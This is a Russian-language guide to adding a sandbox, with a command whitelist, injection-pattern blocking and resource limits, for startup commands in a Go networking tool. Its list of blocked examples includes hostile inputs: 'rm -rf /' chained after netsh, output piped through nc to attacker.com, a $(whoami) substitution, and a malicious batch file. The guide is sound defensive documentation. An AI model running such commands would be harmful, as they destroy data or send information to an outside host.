# Sandbox Integration Guide

## Обзор

Проект теперь использует sandbox для безопасного выполнения команд из `executeOnStart`. Это обеспечивает дополнительный уровень защиты от command injection и ограничивает ресурсы выполняемых команд.

## Что изменилось

### До (старый подход)

```go
// Простая валидация whitelist
func validateExecuteOnStart(cmds []string) error {
    cmd := cmds[0]
    if !isCommandAllowed(cmd) {
        return fmt.Errorf("command not allowed")
    }
    // Базовая проверка аргументов
    for _, arg := range cmds[1:] {
        if strings.ContainsAny(arg, ";|&") {
            return fmt.Errorf("dangerous characters")
        }
    }
    return nil
}

// Прямое выполнение без ограничений
cmd := exec.Command(config.ExecuteOnStart[0], config.ExecuteOnStart[1:]...)
cmd.Run()
```

### После (с sandbox)

```go
// Полная валидация через sandbox
func validateCommandsWithSandbox(commands []string) error {
    return sandbox.ValidateExecuteOnStartCommands(commands, nil)
}

// Выполнение с ограничениями ресурсов и таймаутами
func executeCommandsWithSandbox(ctx context.Context, commands []string) error {
    config := sandbox.ExecuteOnStartConfig{
        Commands:        commands,
        Timeout:         30 * time.Second,
        MaxMemoryMB:     256,
        MaxCPUPercent:   50,
        ContinueOnError: true,
    }
    
    result, err := sandbox.ExecuteOnStart(ctx, config)
    // Детальное логирование результатов
    return err
}
```

## Преимущества

### 1. Безопасность

- ✅ **Whitelist команд** - только разрешенные команды
- ✅ **Защита от инъекций** - проверка опасных паттернов
- ✅ **Изоляция процессов** - выполнение в отдельной группе
- ✅ **Валидация путей** - проверка разрешенных директорий

### 2. Ограничение ресурсов

- ✅ **Таймауты** - автоматическое завершение долгих команд (30s)
- ✅ **Лимит памяти** - максимум 256MB на команду
- ✅ **Лимит CPU** - максимум 50% CPU
- ✅ **Приоритет процесса** - низкий приоритет для фоновых задач

### 3. Надежность

- ✅ **ContinueOnError** - продолжение при ошибках
- ✅ **Детальное логирование** - полная информация о выполнении
- ✅ **Graceful shutdown** - корректное завершение через context
- ✅ **Метрики** - время выполнения, exit codes, использование ресурсов

## Использование

### В config.json

```json
{
  "executeOnStart": [
    "netsh interface ip set dns name=Ethernet static 8.8.8.8",
    "ipconfig /flushdns"
  ]
}
```

### Логи выполнения

```
INFO Executing commands with sandbox protection count=2 timeout=30s
INFO Executing command in sandbox index=1 total=2 command="netsh interface ip set dns..."
INFO Command executed successfully command="netsh..." duration=245ms
INFO Executing command in sandbox index=2 total=2 command="ipconfig /flushdns"
INFO Command executed successfully command="ipconfig..." duration=123ms
INFO Sandbox execution completed total_commands=2 success=2 failed=0 duration=368ms
```

### При ошибке

```
WARN Command execution issue index=1 command="invalid-cmd" exit_code=-1 error="command not allowed" timed_out=false
INFO Sandbox execution completed total_commands=2 success=1 failed=1 duration=156ms
```

## Конфигурация

### Настройки по умолчанию

```go
config := sandbox.ExecuteOnStartConfig{
    Timeout:         30 * time.Second,  // Таймаут на команду
    MaxMemoryMB:     256,                // Лимит памяти
    MaxCPUPercent:   50,                 // Лимит CPU
    ContinueOnError: true,               // Продолжать при ошибках
}
```

### Кастомизация

Для изменения настроек отредактируйте `main_sandbox.go`:

```go
func getSandboxConfig() sandbox.Config {
    return sandbox.Config{
        MaxExecutionTime: 60 * time.Second,  // Увеличить таймаут
        MaxMemoryMB:      512,                // Больше памяти
        MaxCPUPercent:    75,                 // Больше CPU
        AllowedCommands:  customWhitelist,    // Свой whitelist
    }
}
```

## Whitelist команд

### Windows (по умолчанию)

```go
allowedCommands := map[string]bool{
    "netsh":    true,
    "ipconfig": true,
    "ping":     true,
    "route":    true,
    "arp":      true,
    "nssm":     true,
    "sc":       true,
}
```

### Linux/macOS (по умолчанию)

```go
allowedCommands := map[string]bool{
    "iptables":  true,
    "ip":        true,
    "ifconfig":  true,
    "ping":      true,
    "route":     true,
    "arp":       true,
    "systemctl": true,
}
```

### Добавление команд

Отредактируйте `allowedCommands` в `main.go`:

```go
var allowedCommands = map[string]bool{
    // Существующие команды...
    
    // Добавить новые
    "tracert":  true,  // Windows
    "nslookup": true,  // Windows/Unix
    "dig":      true,  // Unix
}
```

## Разрешенные пути

Команды из этих директорий разрешены автоматически:

### Windows
- `C:\Windows\System32\`
- `C:\Program Files\`

### Linux/macOS
- `/usr/bin/`
- `/usr/sbin/`
- `/bin/`
- `/sbin/`

## Блокируемые паттерны

Автоматически блокируются:

```
;     - Command chaining
|     - Pipe
&     - Background/chain
$     - Variable expansion
`     - Command substitution
$(    - Command substitution
${    - Variable expansion
&&    - AND chain
||    - OR chain
../   - Path traversal
\n    - Newline injection
\r    - Carriage return
```

## Примеры

### ✅ Разрешенные команды

```json
{
  "executeOnStart": [
    "netsh interface ip set dns name=Ethernet static 8.8.8.8",
    "ipconfig /flushdns",
    "ping -n 4 8.8.8.8",
    "route print"
  ]
}
```

### ❌ Заблокированные команды

```json
{
  "executeOnStart": [
    "netsh interface show; rm -rf /",           // Command chaining
    "ping 8.8.8.8 | nc attacker.com 1234",     // Pipe
    "ipconfig && echo hacked",                  // AND chain
    "ping $(whoami)",                           // Command substitution
    "cmd /c malicious.bat",                     // cmd не в whitelist
    "powershell -Command Get-Process"           // powershell не в whitelist
  ]
}
```

## Миграция

### Шаг 1: Обновить main.go

Замените старую функцию `validateExecuteOnStart` на:

```go
// Используем новую валидацию через sandbox
if err := validateCommandsWithSandbox(config.ExecuteOnStart); err != nil {
    slog.Error("executeOnStart validation failed", "err", err)
    return
}
```

### Шаг 2: Обновить выполнение команд

Замените прямое выполнение на:

```go
// Выполнение через sandbox
if err := executeCommandsWithSandbox(_gracefulCtx, config.ExecuteOnStart); err != nil {
    slog.Warn("executeOnStart execution had errors", "err", err)
}
```

### Шаг 3: Тестирование

```bash
# Запустить unit тесты
test-unit.bat

# Запустить sandbox тесты
test-sandbox.bat

# Запустить интеграционные тесты
test-integration.bat
```

## Troubleshooting

### Команда блокируется

**Проблема:** `command not allowed: mycmd`

**Решение:** Добавьте команду в whitelist:

```go
var allowedCommands = map[string]bool{
    "mycmd": true,
}
```

### Таймаут команды

**Проблема:** `command timed out after 30s`

**Решение:** Увеличьте таймаут в `getSandboxConfig()`:

```go
MaxExecutionTime: 60 * time.Second,
```

### Опасный паттерн

**Проблема:** `dangerous argument pattern detected: arg;malicious`

**Решение:** Это защита от инъекций. Проверьте аргументы команды на наличие опасных символов.

### Недостаточно памяти

**Проблема:** Команда падает из-за нехватки памяти

**Решение:** Увеличьте лимит памяти:

```go
MaxMemoryMB: 512,
```

## Производительность

### Overhead

Sandbox добавляет минимальный overhead:

```
Validation:  ~250 ns/op
Execution:   ~1-2ms overhead
Total:       < 1% для большинства команд
```

### Оптимизация

- Переиспользуйте executor для множественных команд
- Используйте `ContinueOnError: true` для параллельного выполнения
- Кэшируйте результаты валидации

## Безопасность

### Best Practices

1. ✅ Минимальный whitelist - только необходимые команды
2. ✅ Короткие таймауты - предотвращают зависание
3. ✅ Лимиты ресурсов - защита от DoS
4. ✅ Логирование - записывайте все выполненные команды
5. ✅ Валидация - всегда проверяйте перед выполнением

### Что НЕ делать

1. ❌ Не добавляйте `cmd`, `powershell`, `bash` в whitelist
2. ❌ Не передавайте пользовательский ввод напрямую
3. ❌ Не отключайте валидацию
4. ❌ Не используйте бесконечные таймауты
5. ❌ Не игнорируйте ошибки выполнения

## Дополнительные ресурсы

- [sandbox/README.md](sandbox/README.md) - Полная документация sandbox
- [sandbox/examples_test.go](sandbox/examples_test.go) - Примеры использования
- [SECURITY.md](SECURITY.md) - Рекомендации по безопасности

## Поддержка

При возникновении проблем:

1. Проверьте логи: `go-pcap2socks.log`
2. Включите debug: `$env:SLOG_LEVEL="debug"`
3. Запустите тесты: `test-sandbox.bat`
4. Откройте Issue на GitHub
